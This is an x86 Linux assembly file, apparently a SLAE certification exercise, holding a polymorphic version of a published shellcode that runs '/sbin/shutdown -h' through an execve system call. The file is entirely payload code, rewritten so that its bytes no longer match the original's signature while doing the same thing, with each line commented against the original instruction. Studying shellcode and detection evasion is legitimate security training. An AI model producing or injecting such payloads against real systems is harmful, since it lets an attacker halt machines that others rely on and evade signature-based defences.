; Filename    : shutdown.asm
; Author      : Joris Hartog
; Date        : 07-12-2015
; Student     : SLAE-704
; Size        : 82 bytes
; Description : This program is a polymorphic version of a shutdown shellcode.
;  The original code can be found at:
;   http://shell-storm.org/shellcode/files/shellcode-876.php
;  The original shellcode was 56 bytes long, this version 82 bytes. 


global _start

section .text

_start:

;	Polymorphic			;	Original

clearD:	

	dec edx				;	xor eax, eax
	jnz clearD			;	xor edx, edx
	push edx			;	push eax
	mov eax, edx			;

	mov byte [esp-1], 0x2d 		;	push word 0x682d
	mov byte [esp-2], 0x68		;
	sub esp, 4			;
	mov esi, esp			;	mov edi, esp	; Note: edi <-> esi
	
	push edx			;	push eax
	sub esp, 4
	mov byte [esp], 0x6e		;	push 0x6e

	mov word [esp+1], 0x666e	;	mov word [esp+0x1], 0x776f
	add word [esp+1], 0x1101	;

	mov esi, esp			;	mov edi, esp
	
	jmp getPointer			;	push eax
continue:				;	push 0x6e776f64
	pop ebx				;	push 0x74756873
					;	push 0x2f2f2f6e
					;	push 0x6962732f
					;	mov ebx, esp
	push eax			;	push edx
	push edi			;	push esi
	push esi			;	push edi
	push ebx			;	push ebx
	mov eax, esp			;	mov ecx, esp
	mov ecx, eax			;
	push byte 0xb			;	mov al, 0xb
	pop eax				;
	int 0x80			;	int 0x80

getPointer:
	call continue
	string : db 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e
